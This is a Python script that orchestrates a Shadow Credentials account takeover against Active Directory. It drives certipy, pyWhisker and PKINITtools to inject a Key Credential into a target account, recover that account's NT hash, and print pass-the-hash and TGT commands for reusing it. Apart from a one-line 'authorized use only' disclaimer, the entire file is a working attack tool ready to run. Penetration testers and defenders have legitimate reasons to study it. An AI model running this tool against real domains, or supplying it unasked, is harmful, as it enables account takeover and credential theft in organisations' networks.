#!/usr/bin/env python3
"""
shadowcred_takeover.py — Orchestrate a Shadow Credentials account takeover.

Wraps the real `certipy shadow auto` workflow (and optionally pyWhisker +
PKINITtools) to add a Key Credential to a target's msDS-KeyCredentialLink,
recover the NT hash via PKINIT, and clean up. Parses the tool output to surface
the recovered NT hash and TGT path.

Authorized use only. Requires write access over the target's
msDS-KeyCredentialLink and a DC running Windows Server 2016+ with PKINIT.

Install:
    pipx install certipy-ad
    git clone https://github.com/ShutdownRepo/pywhisker
    git clone https://github.com/dirkjanm/PKINITtools

Examples:
    python shadowcred_takeover.py certipy -u attacker@corp.local -p 'Passw0rd!' \
        --dc-ip 10.0.0.100 --target 'WS01$'
    python shadowcred_takeover.py pywhisker -d corp.local -u attacker \
        -p 'Passw0rd!' --dc-ip 10.0.0.100 --target victim \
        --pywhisker ./pywhisker/pywhisker.py
"""
import argparse
import os
import re
import shutil
import subprocess
import sys


def _which_or_die(binary, hint):
    if shutil.which(binary) is None and not os.path.exists(binary):
        sys.exit(f"[!] '{binary}' not found. {hint}")


def run(cmd, timeout=600):
    print("[*] Running:", " ".join(cmd))
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        sys.exit(f"[!] Command timed out after {timeout}s.")
    out = proc.stdout + proc.stderr
    print(out)
    return proc.returncode, out


def parse_nthash(text):
    """Certipy prints 'Got hash for ...: aad3b...:<NT>'. Extract the NT half."""
    m = re.search(r"[Gg]ot hash for .*?:\s*([0-9a-fA-F]{32}):([0-9a-fA-F]{32})", text)
    if m:
        return m.group(2)
    m = re.search(r"\b[0-9a-fA-F]{32}:([0-9a-fA-F]{32})\b", text)
    return m.group(1) if m else None


def certipy_flow(args):
    _which_or_die("certipy", "Install with: pipx install certipy-ad")
    cmd = ["certipy", "shadow", "auto",
           "-u", args.user, "-dc-ip", args.dc_ip, "-account", args.target]
    if args.password:
        cmd += ["-p", args.password]
    elif args.hashes:
        cmd += ["-hashes", args.hashes]
    elif args.kerberos:
        cmd += ["-k", "-no-pass"]
    else:
        sys.exit("[!] Provide -p, --hashes, or -k.")
    if args.ns:
        cmd += ["-ns", args.ns, "-dns-tcp"]
    rc, out = run(cmd)
    if rc != 0:
        sys.exit("[!] certipy shadow auto failed.")
    nt = parse_nthash(out)
    if nt:
        print(f"\n[+] Recovered NT hash for {args.target}: {nt}")
        print(f"[+] Reuse it: nxc smb {args.dc_ip} -u {args.target.rstrip('$')} -H {nt}")
    else:
        print("[!] Could not auto-extract NT hash; review output above.")


def pywhisker_flow(args):
    if not args.pywhisker or not os.path.exists(args.pywhisker):
        sys.exit("[!] --pywhisker must point to pywhisker.py")
    base = "shadow_" + args.target.rstrip("$")
    cmd = ["python3", args.pywhisker, "-d", args.domain, "-u", args.user,
           "--target", args.target, "--action", "add", "--filename", base]
    if args.password:
        cmd += ["-p", args.password]
    elif args.kerberos:
        cmd += ["-k", "--no-pass"]
    else:
        sys.exit("[!] Provide -p or -k.")
    if args.dc_ip:
        cmd += ["--dc-ip", args.dc_ip]
    rc, out = run(cmd)
    if rc != 0:
        sys.exit("[!] pyWhisker add failed.")
    pfx_pass = None
    m = re.search(r"[Pp]assword(?: for the PFX)?:\s*(\S+)", out)
    if m:
        pfx_pass = m.group(1)
    print(f"\n[+] Key Credential added. PFX: {base}.pfx  PFX-pass: {pfx_pass}")
    print("[+] Next, request a TGT with PKINITtools:")
    print(f"    python3 gettgtpkinit.py -cert-pfx {base}.pfx -pfx-pass {pfx_pass} "
          f"{args.domain}/{args.target.rstrip('$')} {base}.ccache")
    print("    export KRB5CCNAME=%s.ccache" % base)
    print(f"    python3 getnthash.py -key <AS-REP-KEY> {args.domain}/{args.target.rstrip('$')}")
    print("[!] Remember to clean up the injected Key Credential when done:")
    print(f"    python3 {args.pywhisker} -d {args.domain} -u {args.user} "
          f"--target {args.target} --action clear")


def main():
    ap = argparse.ArgumentParser(description="Shadow Credentials takeover orchestrator.")
    sub = ap.add_subparsers(dest="mode", required=True)

    c = sub.add_parser("certipy", help="Use certipy shadow auto (end to end)")
    c.add_argument("-u", "--user", required=True, help="attacker@domain")
    c.add_argument("-p", "--password")
    c.add_argument("--hashes")
    c.add_argument("-k", "--kerberos", action="store_true")
    c.add_argument("--dc-ip", required=True, dest="dc_ip")
    c.add_argument("--target", required=True, help="victim or WS01$")
    c.add_argument("--ns")

    w = sub.add_parser("pywhisker", help="Use pyWhisker add (manual PKINIT after)")
    w.add_argument("-d", "--domain", required=True)
    w.add_argument("-u", "--user", required=True)
    w.add_argument("-p", "--password")
    w.add_argument("-k", "--kerberos", action="store_true")
    w.add_argument("--dc-ip", dest="dc_ip")
    w.add_argument("--target", required=True)
    w.add_argument("--pywhisker", required=True, help="Path to pywhisker.py")

    args = ap.parse_args()
    if args.mode == "certipy":
        certipy_flow(args)
    else:
        pywhisker_flow(args)


if __name__ == "__main__":
    main()
